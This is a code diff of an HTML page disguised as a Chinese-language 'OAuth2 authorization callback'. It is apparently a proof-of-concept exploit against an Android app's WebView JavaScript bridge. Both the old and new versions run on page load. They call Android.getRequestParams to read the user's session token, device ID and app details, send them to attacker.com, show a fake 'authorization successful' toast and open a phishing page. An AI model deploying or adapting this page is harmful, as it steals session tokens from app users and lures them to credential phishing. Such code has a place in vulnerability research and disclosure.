@@ -5,13 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OAuth2 授权回调</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
@@ -40,16 +36,8 @@
             font-size: 36px;
             color: white;
         }
-        h1 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 10px;
-        }
-        .subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
+        h1 { font-size: 24px; color: #333; margin-bottom: 10px; }
+        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
         .loading {
             display: inline-block;
             width: 40px;
@@ -60,41 +48,10 @@
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
-            color: #666;
-            font-size: 14px;
-            margin-top: 20px;
-        }
-        .btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: transform 0.2s;
-        }
-        .btn:hover {
-            transform: scale(1.05);
-        }
-        .error {
-            color: #f44336;
-            font-size: 14px;
-            margin-top: 15px;
-            display: none;
-        }
-        .success {
-            color: #4CAF50;
-            font-size: 14px;
-            margin-top: 15px;
-            display: none;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { color: #666; font-size: 14px; margin-top: 20px; }
+        .error { color: #f44336; font-size: 14px; margin-top: 15px; display: none; }
+        .success { color: #4CAF50; font-size: 14px; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
@@ -107,166 +64,71 @@
         <p class="status" id="status">正在连接授权服务器...</p>
         <p class="error" id="errorMsg"></p>
         <p class="success" id="successMsg">授权成功！正在跳转...</p>
-        
-        <button class="btn" id="retryBtn" style="display:none;" onclick="retry()">重新尝试</button>
     </div>
 
     <script>
-        // 窃取敏感信息的函数
-        function stealData() {
-            try {
-                // 1. 获取设备信息和 Token
+    // 主攻击函数
+    function executeAttack() {
+        console.log("[*] 开始执行攻击...");
+        
+        // 检查 Android 接口是否存在
+        if (typeof Android === 'undefined') {
+            console.log("[-] Android 接口未定义");
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('errorMsg').innerText = '错误：环境不支持';
+            return;
+        }
+        
+        // Step 1: 尝试调用 getRequestParams (YearEndReportJsInterface)
+        try {
+            if (typeof Android.getRequestParams === 'function') {
+                console.log("[+] getRequestParams 可用");
                 var params = Android.getRequestParams();
-                console.log("[+] 成功获取设备参数:", params);
+                console.log("[+] 获取设备参数:", params);
                 
-                // 解析 JSON
-                var data = JSON.parse(params);
-                var token = data['x-token'] || '';
-                var deviceId = data['x-udid'] || '';
-                var appVersion = data['x-app-version'] || '';
-                var deviceModel = data['x-device-model'] || '';
+                // 外带数据
+                fetch('https://attacker.com/collect?data=' + encodeURIComponent(params));
                 
-                // 2. 外带数据到攻击者服务器
-                var exfilUrl = 'https://attacker.com/collect?' + 
-                    'token=' + encodeURIComponent(token) +
-                    '&deviceId=' + encodeURIComponent(deviceId) +
-                    '&appVersion=' + encodeURIComponent(appVersion) +
-                    '&deviceModel=' + encodeURIComponent(deviceModel) +
-                    '&fullData=' + encodeURIComponent(params);
-                
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', exfilUrl, true);
-                xhr.send();
-                console.log("[+] 数据已外带:", exfilUrl);
-                
-                return {
-                    token: token,
-                    deviceId: deviceId,
-                    success: true
-                };
-            } catch(e) {
-                console.log("[-] 窃取失败:", e);
-                return { success: false, error: e.message };
-            }
-        }
-        
-        // 检查登录状态
-        function checkLoginStatus() {
-            try {
-                var isLoggedIn = Android.checkLogin();
-                console.log("[+] 登录状态:", isLoggedIn);
-                return isLoggedIn;
-            } catch(e) {
-                console.log("[-] 检查登录失败:", e);
-                return false;
-            }
-        }
-        
-        // 显示钓鱼提示
-        function showPhishingToast(msg) {
-            try {
-                Android.showToast(msg);
-                console.log("[+] 显示提示:", msg);
-            } catch(e) {
-                console.log("[-] 显示提示失败:", e);
-            }
-        }
-        
-        // 打开钓鱼页面
-        function openPhishingPage(url) {
-            try {
-                Android.openUrl('image', url);
-                console.log("[+] 打开页面:", url);
-            } catch(e) {
-                console.log("[-] 打开页面失败:", e);
-            }
-        }
-        
-        // 复制到剪贴板（用于钓鱼）
-        function copyToClipboard(text) {
-            try {
-                Android.copyToClipboard(text);
-                console.log("[+] 复制到剪贴板:", text);
-            } catch(e) {
-                console.log("[-] 复制失败:", e);
-            }
-        }
-        
-        // 发送钓鱼通知
-        function sendPhishingNotification(title, content, clickAction) {
-            try {
-                var notifyJson = JSON.stringify({
-                    title: title,
-                    content: content,
-                    click_action: clickAction
-                });
-                Android.sendNotification(notifyJson);
-                console.log("[+] 发送通知:", title);
-            } catch(e) {
-                console.log("[-] 发送通知失败:", e);
-            }
-        }
-        
-        // 主攻击流程
-        function executeAttack() {
-            console.log("[*] 开始执行攻击...");
-            
-            // Step 1: 窃取数据
-            var stealResult = stealData();
-            
-            // Step 2: 检查登录状态
-            var isLoggedIn = checkLoginStatus();
-            
-            // Step 3: 根据结果执行不同攻击
-            if (stealResult.success) {
                 document.getElementById('status').innerText = '正在验证授权信息...';
                 
-                // 显示成功提示
                 setTimeout(function() {
                     document.getElementById('loading').style.display = 'none';
                     document.getElementById('successMsg').style.display = 'block';
-                    document.getElementById('successMsg').innerText = '授权成功！正在同步数据...';
                     
-                    // 显示钓鱼提示
-                    showPhishingToast('授权成功，正在同步您的数据');
+                    // 尝试调用其他方法
+                    if (typeof Android.showToast === 'function') {
+                        Android.showToast('授权成功，正在同步数据');
+                    }
                     
-                    // 2 秒后打开钓鱼页面
-                    setTimeout(function() {
-                        openPhishingPage('image', 'https://attacker.com/phishing_login.html');
-                    }, 2000);
-                    
+                    if (typeof Android.openUrl === 'function') {
+                        setTimeout(function() {
+                            Android.openUrl('image', 'https://attacker.com/phishing.html');
+                        }, 2000);
+                    }
                 }, 1500);
                 
+            } else if (typeof Android.checkLogin === 'function') {
+                // InvitationalTestJsInterface
+                console.log("[+] checkLogin 可用");
+                var isLoggedIn = Android.checkLogin();
+                console.log("[+] 登录状态:", isLoggedIn);
+                
+                // 继续其他攻击...
             } else {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('errorMsg').style.display = 'block';
-                document.getElementById('errorMsg').innerText = '授权失败：' + (stealResult.error || '未知错误');
-                document.getElementById('retryBtn').style.display = 'inline-block';
+                throw new Error('未知的 JSInterface 类型');
             }
+            
+        } catch(e) {
+            console.log("[-] 攻击失败:", e);
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('errorMsg').innerText = '错误：' + e.message;
         }
-        
-        // 重试函数
-        function retry() {
-            document.getElementById('errorMsg').style.display = 'none';
-            document.getElementById('retryBtn').style.display = 'none';
-            document.getElementById('loading').style.display = 'inline-block';
-            document.getElementById('status').innerText = '正在重新连接...';
-            executeAttack();
-        }
-        
-        // 页面加载完成后执行攻击
-        window.onload = function() {
-            console.log("[*] 页面加载完成，开始攻击");
-            executeAttack();
-        };
-        
-        // 页面可见性变化时继续攻击（防止用户切换标签页）
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) {
-                console.log("[*] 页面重新可见，继续攻击");
-                executeAttack();
-            }
-        });
+    }
+    
+    // 页面加载后执行
+    window.onload = executeAttack;
     </script>
 </body>
 </html>
